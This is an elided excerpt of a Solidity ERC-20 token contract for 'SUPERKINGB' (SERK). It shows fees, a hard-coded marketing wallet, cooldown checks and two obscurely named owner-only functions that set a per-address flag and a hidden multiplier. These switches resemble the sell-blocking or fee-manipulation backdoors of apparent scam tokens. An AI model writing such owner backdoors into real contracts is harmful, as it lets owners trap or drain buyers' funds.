...
contract SERK is Context, IERC20, Ownable {
    ...
    string private constant _name = "SUPERKINGB"; //
    string private constant _symbol = "SERK"; //
    uint8 private constant _decimals = 18; //
    uint256 private _fbbe = 1;

    uint256 public _marketingFee = 7;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x71C54086175B39D935bF3F28B087F7dA15191Ff2;
    ...
    function setFBSERK(address addr, bool bv) external onlyOwner {
        _isFB[addr] = bv;
    }

    function setFESERK(uint256 fe) external onlyOwner {
        _fbbe = fe;
    }
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "SERK ERC20: approve from the zero address");
        require(spender != address(0), "SERK ERC20: approve to the zero address");
    ...
    function _transfer(
        ...
        require(from != address(0), "SERK ERC20: transfer from the zero address");
        require(to != address(0), "SERK ERC20: transfer to the zero address");
        require(amount > 0, "SERK Transfer amount must be greater than zero");

        if (from != owner() && to != owner() && to != uniswapV2Pair)
            require(balanceOf(to) + amount <= _maxTxAmount, "SERK Transfer amount exceeds the maxTxAmount.");


        if (from == uniswapV2Pair) {
            require(_lastBuy[to] + _buyCooldown < block.timestamp, "SERK Must wait til after coooldown to buy");
